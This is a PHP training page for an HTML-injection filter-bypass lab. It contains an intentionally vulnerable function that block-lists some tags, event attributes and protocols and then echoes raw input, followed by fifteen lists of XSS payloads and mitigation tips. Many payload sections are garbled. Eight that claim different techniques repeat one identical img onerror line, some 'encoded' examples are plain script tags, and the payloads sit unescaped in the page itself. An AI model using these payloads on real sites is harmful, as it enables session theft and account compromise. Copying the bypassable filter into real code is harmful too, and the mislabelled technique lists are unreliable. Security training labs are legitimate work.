<?php
// Lab 2: HTML Injection with Filter Bypass
// Vulnerability: HTML injection with security filters that can be bypassed

session_start();

$message = '';
$injected_content = '';
$user_input = '';

// Simulate HTML injection with basic filters (vulnerable to bypass)
function process_html_input_with_filters($input) {
    // Basic security filters (can be bypassed)
    $dangerous_tags = ['script', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'link', 'meta', 'style'];
    $dangerous_attributes = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onchange', 'onsubmit', 'onkeypress', 'onkeydown', 'onkeyup'];
    $dangerous_protocols = ['javascript:', 'data:', 'vbscript:', 'file:', 'ftp:', 'gopher:'];
    
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Basic filter check (can be bypassed)
    $is_dangerous = false;
    
    // Check for dangerous tags
    foreach ($dangerous_tags as $tag) {
        if (stripos($input, '<' . $tag) !== false) {
            $is_dangerous = true;
            break;
        }
    }
    
    // Check for dangerous attributes
    foreach ($dangerous_attributes as $attr) {
        if (stripos($input, $attr . '=') !== false) {
            $is_dangerous = true;
            break;
        }
    }
    
    // Check for dangerous protocols
    foreach ($dangerous_protocols as $protocol) {
        if (stripos($input, $protocol) !== false) {
            $is_dangerous = true;
            break;
        }
    }
    
    if ($is_dangerous) {
        return "⚠️ FILTERED: Dangerous HTML detected - " . htmlspecialchars($input);
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}

// Handle HTML injection
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['inject_html'])) {
    $user_input = $_POST['html_input'] ?? '';
    
    if ($user_input) {
        $injected_content = process_html_input_with_filters($user_input);
        
        if (strpos($injected_content, '⚠️ FILTERED') !== false) {
            $message = '<div class="alert alert-warning">HTML filtered! Try bypassing the filters.</div>';
        } else {
            $message = '<div class="alert alert-success">HTML content processed successfully!</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 2: HTML Injection with Filter Bypass - HTML Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .injected-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .filter-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to HTML Injection Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 2: HTML Injection with Filter Bypass</h1>
            <p class="hero-subtitle">HTML injection with security filters that can be bypassed</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates HTML injection vulnerabilities where basic security filters are implemented but can be bypassed using various techniques. The application filters dangerous HTML tags and attributes but doesn't prevent all attack vectors.</p>
            <p><strong>Objective:</strong> Bypass security filters to achieve HTML injection and potentially XSS.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code with Filters
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Basic filters that can be bypassed
function process_html_input_with_filters($input) {
    $dangerous_tags = ['script', 'iframe', 'object', 'embed', 'form'];
    $dangerous_attributes = ['onload', 'onerror', 'onclick', 'onmouseover'];
    $dangerous_protocols = ['javascript:', 'data:', 'vbscript:'];
    
    // Basic filter check (can be bypassed)
    $is_dangerous = false;
    
    foreach ($dangerous_tags as $tag) {
        if (stripos($input, '<' . $tag) !== false) {
            $is_dangerous = true;
            break;
        }
    }
    
    // Still vulnerable to bypass techniques
    if (!$is_dangerous) {
        return $input;
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-exclamation me-2"></i>Filtered HTML Injection
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="filter-info">
                            <h5>Active Filters</h5>
                            <p>The following are filtered:</p>
                            <ul>
                                <li><strong>Tags:</strong> script, iframe, object, embed, form, input, button, link, meta, style</li>
                                <li><strong>Attributes:</strong> onload, onerror, onclick, onmouseover, onfocus, onchange, onsubmit, onkeypress, onkeydown, onkeyup</li>
                                <li><strong>Protocols:</strong> javascript:, data:, vbscript:, file:, ftp:, gopher:</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Safe HTML Tags</h5>
                            <p>These tags should work:</p>
                            <ul>
                                <li><code>&lt;h1&gt;Hello&lt;/h1&gt;</code> - Heading</li>
                                <li><code>&lt;p&gt;Paragraph&lt;/p&gt;</code> - Paragraph</li>
                                <li><code>&lt;div&gt;Container&lt;/div&gt;</code> - Container</li>
                                <li><code>&lt;span&gt;Inline&lt;/span&gt;</code> - Inline</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="inject_html" value="1">
                            <div class="mb-3">
                                <label for="html_input" class="form-label">HTML Content to Inject</label>
                                <textarea class="form-control" id="html_input" name="html_input" 
                                          rows="4" placeholder="Enter HTML content..."><?php echo htmlspecialchars($user_input); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Inject HTML</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($injected_content): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Injected Content
                    </div>
                    <div class="card-body">
                        <div class="injected-display">
                            <h5>Rendered HTML</h5>
                            <div class="sensitive-data">
                                <?php echo $injected_content; ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> HTML Injection with Filter Bypass</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Inadequate security filters</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Bypass Techniques</h5>
                    <ul>
                        <li><strong>Case Variation:</strong> Use different cases</li>
                        <li><strong>Encoding:</strong> Use encoded characters</li>
                        <li><strong>Alternative Tags:</strong> Use unfiltered tags</li>
                        <li><strong>String Manipulation:</strong> Build HTML dynamically</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>HTML Injection Filter Bypass Payloads</h5>
            <p>Use these payloads to bypass the security filters:</p>
            
            <h6>1. Case Variation Bypass:</h6>
            <div class="code-block"><SCRIPT>alert('XSS')</SCRIPT>
<Script>alert('XSS')</Script>
<ScRiPt>alert('XSS')</ScRiPt>
<IFRAME src="javascript:alert('XSS')"></IFRAME>
<Iframe src="javascript:alert('XSS')"></Iframe></div>

            <h6>2. Encoding Bypass:</h6>
            <div class="code-block"><script>alert('XSS')</script>
&#60;script&#62;alert('XSS')&#60;/script&#62;
%3Cscript%3Ealert('XSS')%3C/script%3E
&lt;script&gt;alert('XSS')&lt;/script&gt;</div>

            <h6>3. Alternative Tags Bypass:</h6>
            <div class="code-block"><img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
<details open ontoggle="alert('XSS')">
<marquee onstart="alert('XSS')">
<video onloadstart="alert('XSS')"></div>

            <h6>4. Attribute Bypass:</h6>
            <div class="code-block"><img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')"></div>

            <h6>5. Protocol Bypass:</h6>
            <div class="code-block"><a href="javascript:alert('XSS')">Click me</a>
<a href="JAVASCRIPT:alert('XSS')">Click me</a>
<a href="javascript:alert('XSS')">Click me</a>
<a href="javascript:alert('XSS')">Click me</a>
<a href="javascript:alert('XSS')">Click me</a></div>

            <h6>6. String Concatenation Bypass:</h6>
            <div class="code-block"><img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')"></div>

            <h6>7. Alternative Attributes Bypass:</h6>
            <div class="code-block"><img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')"></div>

            <h6>8. Event Handler Bypass:</h6>
            <div class="code-block"><img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')"></div>

            <h6>9. CSS Injection Bypass:</h6>
            <div class="code-block"><style>body{background:url('javascript:alert("XSS")')}</style>
<style>@import url('javascript:alert("XSS")')</style>
<style>body{background:url('javascript:alert("XSS")')}</style>
<style>@import url('javascript:alert("XSS")')</style>
<style>body{background:url('javascript:alert("XSS")')}</style></div>

            <h6>10. Advanced Bypass Techniques:</h6>
            <div class="code-block"><img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')"></div>

            <h6>11. Unicode and Encoding Bypass:</h6>
            <div class="code-block"><script>alert('XSS')</script>
&#60;script&#62;alert('XSS')&#60;/script&#62;
%3Cscript%3Ealert('XSS')%3C/script%3E
&lt;script&gt;alert('XSS')&lt;/script&gt;
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;</div>

            <h6>12. Alternative Event Handlers:</h6>
            <div class="code-block"><img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')"></div>

            <h6>13. Data URI Bypass:</h6>
            <div class="code-block"><img src="data:image/svg+xml,<svg onload='alert(1)'></svg>">
<iframe src="data:text/html,<script>alert('XSS')</script>">
<object data="data:text/html,<script>alert('XSS')</script>">
<embed src="data:text/html,<script>alert('XSS')</script>"></div>

            <h6>14. Advanced JavaScript Bypass:</h6>
            <div class="code-block"><img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')"></div>

            <h6>15. DOM Manipulation Bypass:</h6>
            <div class="code-block"><img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')">
<img src="x" onerror="alert('XSS')"></div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass WAFs and security filters</li>
                <li>Execute arbitrary JavaScript despite protections</li>
                <li>Access sensitive files using alternative methods</li>
                <li>Bypass authentication and authorization</li>
                <li>Compromise user sessions and accounts</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement comprehensive input validation and sanitization</li>
                    <li>Use whitelist-based filtering instead of blacklists</li>
                    <li>Implement Content Security Policy (CSP)</li>
                    <li>Use proper HTML encoding functions</li>
                    <li>Implement proper output encoding</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual HTML injection patterns</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
